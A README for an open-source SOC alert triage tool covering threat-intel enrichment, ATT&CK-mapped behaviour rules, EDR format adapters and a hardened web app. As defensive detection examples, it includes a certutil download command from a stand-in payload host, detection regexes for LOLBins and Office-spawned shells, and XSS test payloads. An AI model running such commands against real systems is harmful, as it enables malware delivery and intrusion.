# Alert Triage Assistant

[![tests](https://github.com/Liam1123/alert-triage/actions/workflows/tests.yml/badge.svg)](https://github.com/Liam1123/alert-triage/actions/workflows/tests.yml)

An alert enrichment and triage assistant for SOC analysts. It takes an EDR-style alert (JSON), enriches its indicators with threat intel APIs, maps the process behavior to MITRE ATT&CK techniques, and returns a structured triage result with a verdict and the reasons behind it.

**Sources:** VirusTotal (file hashes, IPs, domains) and AbuseIPDB (IPs). Results are cached locally in SQLite for 24 hours.

## Screenshots

![Triage card for multi_indicator.json: malicious verdict from a cached VirusTotal hit plus an Outlook-spawns-cmd behavior rule](docs/screenshots/1440-multi_indicator.png)
*`multi_indicator.json`: a cached VirusTotal hit and an Outlook → cmd.exe behavior finding, both malicious.*

![Triage card for encoded_powershell.json with the decoded PowerShell download cradle](docs/screenshots/1440-encoded_powershell.png)
*`encoded_powershell.json`: the `-enc` argument decoded into a download cradle, with the matched text highlighted.*

![The same encoded PowerShell triage at phone width, with the editor stacked above the card](docs/screenshots/390-encoded_powershell-first-screen.png)
*The same alert at 390px wide: the editor stacks above the triage card.*

## Setup

Requires Python 3.11+.

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

cp .env.example .env
# then edit .env and set VT_API_KEY and ABUSEIPDB_API_KEY
```

`.env` is gitignored. Never commit your key.

## Usage

```bash
python cli.py --demo alerts/eicar.json  # demo: no API calls, intel from the local cache only
python cli.py alerts/eicar.json     # EICAR test file, expected verdict: malicious
python cli.py alerts/unknown.json   # made-up hash, expected verdict: unknown
python cli.py alerts/multi_indicator.json  # EICAR hash + documentation IP + .example domain

# Behavior samples: no hashes, only reserved IPs/domains, so no API calls at all
python cli.py alerts/encoded_powershell.json  # encoded PowerShell hiding a download cradle → malicious
python cli.py alerts/certutil_download.json   # certutil -urlcache → malicious
python cli.py alerts/shadow_delete.json       # vssadmin delete shadows → malicious
python cli.py alerts/office_macro.json        # WINWORD spawning PowerShell → malicious
python cli.py alerts/benign_admin.json        # signed admin script from Program Files → clean
python cli.py alerts/xss_probe.json           # HTML/JS payloads in every field, for testing the web app → suspicious
python cli.py alerts/ocsf_clipboard_stager.json  # OCSF export: char-shifted loader that runs the clipboard → malicious
python cli.py alerts/s1_threat_sample.json       # SentinelOne API response with 3 threats: one card each, then a summary
python cli.py alerts/renamed_certutil.json       # certutil copied to cu.exe, caught by its PE header name → malicious
```

### OCSF alerts

The CLI and the API also accept an OCSF Detection Finding, the shape some EDRs (SentinelOne among them) export. Any JSON with `finding_info` and `evidences` goes through [`adapters/ocsf.py`](adapters/ocsf.py) first:

| OCSF | Alert field |
|---|---|
| `evidences[].process.file.path` (or `.name`) | `file_path` |
| `evidences[].process.file.hashes[]` with `algorithm_id` 3 | `sha256` |
| `evidences[].process.cmd_line`, else the parent's `cmd_line` | `command_line` |
| `evidences[].process.parent_process.file.path` | `parent_process` |
| `evidences[].process.user` (or `actor.user`) | `user`, as `DOMAIN\name` |
| `device.hostname`, `device.name`, or `resources[].name` | `hostname` (`(unknown host)` if none) |
| `finding_info.title`, `severity`/`severity_id`, `finding_info.analytic.name` | `source_detection` |

`\Device\HarddiskVolumeN\` paths become `C:\`. Missing, empty, or wrongly typed fields become None, and the adapter never raises. The command line falls back to the parent's because a detection on a written file (a dropped `.ps1`) has no command line of its own. The interesting one is the process that wrote or ran it.

`source_detection` is what the EDR itself said. It's shown as "EDR said: ..." next to our verdict, and it never changes our verdict. `alerts/ocsf_clipboard_stager.json` is entirely fictional: the host, user, IDs, vendor and hash are all made up.

### SentinelOne threats

The legacy SentinelOne threat JSON (the console's threat export, and what `GET /web/api/v2.1/threats` returns) is detected by its `threatInfo` object and goes through [`adapters/s1_threat.py`](adapters/s1_threat.py):

| SentinelOne threat | Alert field |
|---|---|
| `agentRealtimeInfo.agentComputerName`, else `agentDetectionInfo.agentComputerName` | `hostname` (`(unknown host)` if none) |
| `threatInfo.processUser` | `user` |
| `threatInfo.sha256` | `sha256` |
| `threatInfo.filePath` | `file_path` |
| `threatInfo.maliciousProcessArguments` | `command_line` |
| `threatInfo.originatorProcess` | `parent_process` |
| `threatInfo.threatName`, `.classification`, `.confidenceLevel`, `.detectionEngines[].title` (or `.engines[]`), `.storyline`, and `indicators[]` | `source_detection` |

The vendor's classification and confidence are shown with "EDR said: ..."; they don't change our verdict, so the card can say Clean where the EDR says Trojan (the second threat in the sample does: in demo mode its hash isn't looked up, and running from Downloads is context only). The first 10 indicators are kept, each cut to 200 characters. Paths get the same `\Device\HarddiskVolumeN\` → `C:\` treatment as OCSF, and the adapter never raises.

`alerts/s1_threat_sample.json` is entirely fictional: account, site and agent IDs are made-up numbers and `00000000-…` UUIDs, the IPs are documentation ranges, the only URL (inside an encoded command) is on a `.example` host, and each hash is the SHA-256 of a plain sentence describing the sample, so it can't be a real file's.

### Several alerts at once

A file that holds a JSON list of alerts, or a SentinelOne API response (`{"data": [...], "pagination": ...}`), is triaged alert by alert. Each item is detected on its own, so one list can mix our format, OCSF and SentinelOne threats. The CLI prints every card, then a summary line per alert (verdict, host, title). The API returns a list of results in the same order. Each result's `input_format` says what was detected: `native`, `ocsf` or `s1_threat`.

`multi_indicator.json` makes one VirusTotal call for the EICAR hash. Its IP and domain are reserved documentation values, so they are skipped and never sent to an API. Expected verdict: malicious.

The first line of output says `Mode: demo` or `Mode: live`. `--demo` uses the same no-network path as the web app's demo mode ([`api/demo.py`](api/demo.py)): cached results are served, and anything else is marked `demo: not looked up`. Demo is also the default when neither `VT_API_KEY` nor `ABUSEIPDB_API_KEY` is set (blank counts as unset), since live lookups couldn't run anyway.

Each enrichment line shows `live` (fresh API call), `cached` (from the local cache), or `-` (skipped or failed, so no data).

## Verdict rules

Each enrichment gets its own verdict:

| Source     | malicious               | suspicious      | clean        |
|------------|-------------------------|-----------------|--------------|
| VirusTotal | 5+ engines flag it      | 1–4 engines     | 0 engines    |
| AbuseIPDB  | confidence score ≥ 75   | score 25–74     | score < 25   |

Any error (not found, rate limited, missing key, network failure) gives that enrichment `unknown`.

Behavior findings map to verdicts by severity: **high → malicious**, **medium → suspicious**, **low → context only** (listed, but it doesn't change the verdict). Two or more *different* medium rules on one alert escalate to malicious. If the alert has process details and no rule matches, behavior counts as clean.

**Overall verdict:** the worst individual verdict across intel and behavior, ranked `malicious > suspicious > unknown > clean`. Skipped lookups don't count toward it. A skip means there was nothing to look up, which isn't the same as a failed check. If every lookup was skipped, or the alert has no indicators, the verdict is `unknown`.

**Skipped indicators:** private, loopback, link-local, multicast, reserved, and documentation IP ranges, plus reserved domains (`.example`, `.test`, `.invalid`, `.localhost`, `.local`, `.internal`, and `example.com`/`.net`/`.org`). These are never sent to any API.

## Behavior rules

Rules live in [`rules/behavior_rules.yaml`](rules/behavior_rules.yaml) and are validated with Pydantic at startup. A malformed rule stops the program with an error naming the rule. Each rule has an `id`, `name`, `description`, ATT&CK `techniques`, a `severity`, and a `match` group:

```yaml
- id: office_spawns_shell
  name: Office application spawned a shell or script host
  description: Word, Excel, PowerPoint, or Outlook launching cmd, PowerShell, ...
  techniques: [T1566.001, T1204.002]
  severity: high
  match:
    all_of:                       # every item must match
      - field: parent_process
        regex: '(^|\\)(winword|excel|powerpnt|outlook)\.exe$'
      - any_of:                   # at least one must match
          - field: image
            regex: '^(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32)\.exe$'
          - field: command_line
            regex: '^"?([a-z]:\\([^"\\]+\\)*)?(cmd|powershell|...)(\.exe)?"?(\s|$)'
```

Conditions can check `command_line`, `file_path`, `parent_process`, `image` (the process file name, taken from `file_path` or the start of the command line), and `original_file_name` (the OriginalFileName from the PE header, as a file name). A condition with `differs_from: image` only matches when the two names differ (case-insensitive, a missing `.exe` ignored). Regexes are case-insensitive. Before matching, text is deobfuscated: carets (`^`) and empty quote pairs (`""`) are removed and whitespace is collapsed.

**Encoded PowerShell:** when a PowerShell command line uses `-EncodedCommand` (or `-e`, `-enc`, ...), the base64 is decoded as UTF-16LE (falling back to UTF-8) and the rules run again on the decoded script. The decoded text appears in the output. It is size-capped and never executed.

**Character-shift decoding:** when a command line has a `[char]([int]$c - N)` (or `+ N`) step with a constant shift from 1 to 25, that same shift is applied to the longest single-quoted string literal in the command line. If the result reads as text, the rules run again on it, and findings say "in char-shift-decoded command". Decoding uses the raw command line, because shifted text often contains carets that deobfuscation would strip. It is size-capped and never executed. Double-quoted literals are not decoded, because they can contain escapes and variables.

**ATT&CK data:** technique names and tactics come from [`data/attack_techniques.json`](data/attack_techniques.json), generated from MITRE's official STIX data. To refresh it after a new ATT&CK release:

```bash
python scripts/update_attack.py
```

A test checks that every technique ID in the rules file exists in that data.

### Evasion I found in my own rules, and the fix

**The bypass.** Every rule about a specific program recognised it by name: `\bcertutil(\.exe)?\b` in the command line, or `^rundll32\.exe$` as the image. Copy `certutil.exe` to `C:\Users\Public\cu.exe`, run `cu.exe -urlcache -f http://payload.example/a.exe a.exe`, and nothing fires. The download is identical, but the rules only see the name on disk, and the attacker picks that name.

**Why OriginalFileName beats it.** A Windows executable carries a version resource inside the file, and one of its fields is `OriginalFileName` (`CertUtil.exe`, `MSHTA.EXE`, `REGSVR32.EXE`). Renaming or copying the file doesn't touch it, because it lives in the file's bytes, not the filesystem entry. EDRs read it and report it next to the image path. Alerts now have an optional `original_file_name`, and the rules use it two ways:

- The LOLBin rules (certutil, mshta, regsvr32, rundll32, procdump, PowerShell) identify the program by its name on disk **or** its original file name, with an `any_of` around just that check. The rest of each rule is unchanged, so `cu.exe -urlcache` is still a certutil download.
- A new rule, **Renamed system binary** (T1036.003 Masquerading: Rename Legitimate Utilities, tactic Stealth, high), fires when the original file name is a known Windows or Sysinternals tool but the image name differs. Legitimate software almost never renames a system binary, so the rename is a finding in itself. It compares file names only and case-insensitively, so `CertUtil.exe` vs `certutil.exe` isn't a rename. It also ignores a missing `.exe`, because Sysinternals' resource says just `procdump`. With no `original_file_name`, nothing changes: the old name-based matching applies as before.

`alerts/renamed_certutil.json` is that exact case. It fires both the certutil rule (through the original name) and the renamed-binary rule, and it comes back malicious.

**What it still misses.** `OriginalFileName` is only as honest as the file that carries it. An attacker who compiles their own downloader can write any version resource they like: call it `notepad.exe`, or leave it out entirely, and neither the name rules nor the rename rule has anything to catch. Copying the real certutil is caught because Microsoft's resource is in it, and that's exactly what an attacker who brings their own binary avoids. That's why hash reputation (VirusTotal) still matters next to behavior rules: a freshly built binary has no good reputation, and a known tool has a known hash. Signatures help too. A file that claims to be `CertUtil.exe` but isn't signed by Microsoft is lying, and that check belongs on the list of next steps.

## Cache

Successful lookups are stored in `enrichment_cache.sqlite3` in the project folder (gitignored) for 24 hours, keyed by source, indicator type, and indicator. Errors, rate limits, and skips are never cached. Delete the file to force fresh lookups.

## Testing against live data

The sample alerts use only harmless or reserved values. To see real IP and domain results, pick an indicator yourself from a public threat feed, for example:

- [abuse.ch Feodo Tracker](https://feodotracker.abuse.ch/browse/) (botnet C2 IPs)
- [abuse.ch ThreatFox](https://threatfox.abuse.ch/browse/) (IPs, domains, hashes)
- [abuse.ch URLhaus](https://urlhaus.abuse.ch/browse/) (malware distribution domains)

Then put it in a local alert file. `alerts/local/` is gitignored, so it won't be committed:

```bash
mkdir -p alerts/local
cat > alerts/local/live_test.json <<'JSON'
{
  "hostname": "WS-LAB-01",
  "remote_ip": "<IP from the feed>",
  "domain": "<domain from the feed>"
}
JSON
python cli.py alerts/local/live_test.json
```

Be careful with live indicators:

- **Don't visit them:** never browse to, ping, or resolve the domains and IPs yourself. This tool only asks the threat intel APIs about them.
- **API quota:** each live run uses your quota (the VirusTotal free tier allows 4 requests per minute). Running the same alert again within 24 hours uses the cache.
- **Old entries:** feed entries go stale. An IP that was malicious last month may come back clean or suspicious now.

## Web app

A FastAPI backend and a single-screen web app: paste an alert (or load a sample) on the left, press **Triage** or <kbd>Ctrl</kbd>/<kbd>⌘</kbd>+<kbd>Enter</kbd>, and the triage card appears on the right. The card says which format was detected ("Detected: SentinelOne threat").

**Files:** **Open JSON file**, or drop one onto the editor. The browser reads it with `FileReader`, puts the text in the editor and triages it. Files over 64 KB, files that aren't text, and invalid JSON are refused with a message naming the file. The text only ever goes into the textarea, never into the page as HTML.

**Lists:** a list (up to 25 alerts) comes back as a compact list of verdict, host and title. A row opens that alert's full card, with **Previous**/**Next** and a way back to the list.

```bash
uvicorn api.main:app --reload            # http://127.0.0.1:8000, demo mode
ALLOW_LIVE=1 uvicorn api.main:app        # also allows live lookups (uses your API quota)
```

| Route | What it does |
|---|---|
| `POST /api/triage` | Body: one alert as JSON (ours, OCSF, or a SentinelOne threat), or a list of up to 25 (or a SentinelOne `{"data": [...]}` response). Response: the `TriageResult`, or a list of them. Add `?live=true` for live lookups. |
| `GET /api/samples` | The sample alerts in `alerts/` (name + JSON), for the page's "Load sample" menu. |
| `GET /api/health` | `ok`, which API keys are configured (booleans only), and whether live lookups are allowed. |

### Demo vs live

**Demo is the default** and makes no network calls at all. Indicators already in the local cache are served from it (marked `cached`). Anything that would need an API call is marked `demo: not looked up`, and like any skip it doesn't count toward the verdict. The local checks still run, so a documentation IP still says "documentation range" and a malformed hash still says it's invalid. Behavior analysis always runs, because it's local.

**Live** needs both `?live=true` on the request (the "Live lookups" checkbox) **and** `ALLOW_LIVE=1` in the server's environment. Without `ALLOW_LIVE=1`, a live request is refused with 403 and nothing is looked up.

Demo mode is a `Cache` subclass (`api/demo.py`) whose cache misses never call the lookup function. `triage()` only reaches the network through the cache, so the core didn't change to support it.

### Security choices

- **Keys stay server-side.** `.env` is loaded once at startup. Keys are only ever sent in request headers to VirusTotal and AbuseIPDB. No response, log line or error message includes one. `/api/health` reports booleans only.
- **Strict input.** Bodies over 64 KB get a 413. That's enough for a realistic OCSF export (typically a few KB to a few tens of KB). The strict field caps still apply after conversion. The size is checked against Content-Length *and* while reading, for chunked uploads. The alert is validated by a strict subclass of `Alert`: unknown fields are rejected, every string is length-capped, and validation errors name the field without echoing the value. Only `application/json` is accepted, which also blocks cross-site form posts.
- **Rate limits per client IP.** 10 triage requests a minute, and 2 alerts a minute with live lookups (live also counts toward the 10), with a `Retry-After` header. A list counts once toward the 10, since demo triage never leaves the machine, but once *per alert* toward the live limit, since each alert spends API quota. So a live request takes at most 2 alerts, and longer lists are refused with a 422 before anything is spent. A list is capped at 25 alerts, and the 64 KB body limit covers the whole list. The limiter is in memory (`api/ratelimit.py`). With several workers or containers each one counts separately (so a client gets N× the limit), a restart resets it, and behind a reverse proxy every user shares the proxy's IP. Before scaling out, move it to Redis or the proxy.
- **Local and same-origin by default.** uvicorn binds to 127.0.0.1 unless you pass `--host`. There is no CORS middleware, so browsers refuse cross-origin reads.
- **Security headers on every response, errors included:** a Content-Security-Policy allowing only this origin's own scripts, styles, fonts and images (no inline script, no third-party origins, `frame-ancestors 'none'`), `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY`. The font (IBM Plex, OFL) is self-hosted in `web/fonts/`.
- **Generic errors.** Clients get short messages like "Internal server error". Tracebacks go to the server log only. `/docs` and `/openapi.json` are turned off.
- **The alert is treated as hostile.** The frontend builds every value with `textContent` and DOM nodes. `innerHTML` and its relatives are banned, and a test checks for them. Outbound links are only built for known origins (VirusTotal, AbuseIPDB, MITRE ATT&CK). `alerts/xss_probe.json` puts `<script>`, `<img onerror>` and `<svg onload>` payloads into the hostname, user, command line, decoded command and domain. They all render as visible text.

## Project layout

```
models.py               Pydantic models: Alert, EnrichmentResult, TriageResult
enrichers/virustotal.py VirusTotal v3: lookup_sha256, lookup_ip, lookup_domain
enrichers/abuseipdb.py  AbuseIPDB v2: lookup_ip
enrichers/common.py     Shared HTTP call + error handling (every enricher uses it)
enrichers/indicators.py IP/domain validation and skip rules
cache.py                SQLite cache with a TTL
behavior.py             analyze(alert): deobfuscation, PowerShell decoding, severity → verdict
rules.py                Rule models, YAML loader/validator, and matching
rules/behavior_rules.yaml  The detection rules
attack.py               ATT&CK technique/tactic lookup (offline)
data/attack_techniques.json  Generated from MITRE STIX (committed)
scripts/update_attack.py     Regenerates the ATT&CK data
triage.py               triage(alert) -> TriageResult; combines intel + behavior
cli.py                  Command-line entry point (the only module that prints)
adapters/__init__.py    split() lists, detect_format(), alert_fields(): what the CLI and API call
adapters/ocsf.py        OCSF Detection Finding → Alert (auto-detected by the CLI and API)
adapters/s1_threat.py   SentinelOne threat (legacy console/API JSON) → Alert
adapters/common.py      Field helpers shared by the adapters
api/main.py             FastAPI app: routes, body limit, rate limits, security headers
api/demo.py             DemoCache: triage without network calls
api/ratelimit.py        In-memory sliding-window rate limiter
api/schemas.py          Strict request model (unknown fields rejected, lengths capped)
web/                    The single-screen web app (plain HTML/CSS/JS, self-hosted font)
alerts/                 Sample alerts (fictional hosts and users)
tests/                  pytest + respx tests (all HTTP is mocked)
```

## Tests

```bash
python -m pytest -v
```

The tests mock every HTTP call with respx, so they never contact any real API and need no API keys. They also use a temporary cache file, never the real one.

### Lint, rules check, and CI

```bash
pip install -r requirements-dev.txt   # adds ruff
ruff check .                          # lint (settings in ruff.toml; the code is not auto-formatted)
python scripts/check_rules.py         # rules load and every technique ID is in the ATT&CK data
```

[`.github/workflows/tests.yml`](.github/workflows/tests.yml) runs on every push and pull request:

- **Lint and rules check:** ruff, then `scripts/check_rules.py`. It's a separate job, so a bad rule fails the build even if the tests are skipped.
- **Tests:** pytest on Python 3.14 (the development version) and 3.12. `VT_API_KEY` and `ABUSEIPDB_API_KEY` are set to empty, to prove the tests need no secrets.
- **Secret scan:** [gitleaks](https://github.com/gitleaks/gitleaks-action) scans the pushed commits, so a committed API key fails the build. If one ever lands, rotate the key; removing the commit doesn't un-leak it.
